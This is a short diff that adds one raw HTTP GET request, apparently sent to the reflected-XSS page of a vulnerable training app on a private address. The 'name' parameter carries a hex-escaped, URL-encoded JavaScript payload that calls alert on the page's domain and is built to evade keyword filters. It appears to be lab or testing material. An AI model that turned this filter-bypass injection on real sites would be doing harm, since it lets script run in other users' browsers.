@@ -1,0 +1,10 @@
+GET /vulnerabilities/xss_r/?name=top%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28top%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27%5Cx64%5Cx6f%5Cx6d%5Cx61%5Cx69%5Cx6e%27%5D%29%3B%2F%2F HTTP/1.1
+Host: 10.10.3.128:2280
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.3.128:2280/vulnerabilities/xss_r/?name=
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
